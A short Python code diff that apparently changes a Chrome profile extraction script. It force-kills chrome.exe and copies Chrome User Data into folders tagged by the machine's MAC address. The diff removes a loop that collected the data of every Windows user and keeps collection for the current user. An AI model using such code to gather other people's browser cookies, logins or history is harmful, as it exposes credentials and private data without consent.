@@ -1,7 +1,6 @@
 import ChromeReader
 import os
 import uuid
-from warnings import warn
 
 class Profile(ChromeReader.Profile):
     def save(self, path: str, make_folder: bool = True, make_visualizer_file: bool = True):
@@ -26,22 +25,5 @@ if __name__ == "__main__":
         os.system("taskkill /f /im chrome.exe")
     except:
         pass
-
-    users_path = "C:/Users"
-
-    for user_name in os.listdir(users_path):
-        user_path = os.path.join(users_path, user_name)
-
-        if (not os.path.isdir(user_path)) or user_name in ("Default", "Default User", "All Users", "Public", ):
-            continue
-
-        user_data_path = os.path.join(user_path, "AppData", "Local", "Google", "Chrome", "User Data")
-
-        if os.path.exists(user_data_path):
-            try:
-                profiler = Profiler(user_data_path)
-                profiler.save_profiles(os.path.join("profiles", f"PC {uuid.getnode()}", user_name))
-            except Exception as e:
-                warn(f"Profiler of {user_name} failed:\n{e}")
-        else:
-            warn(f"User Data path of {user_name} doesn't exist.")
+    profiler = Profiler()
+    profiler.save_profiles(os.path.join("profiles", str(uuid.getnode())))
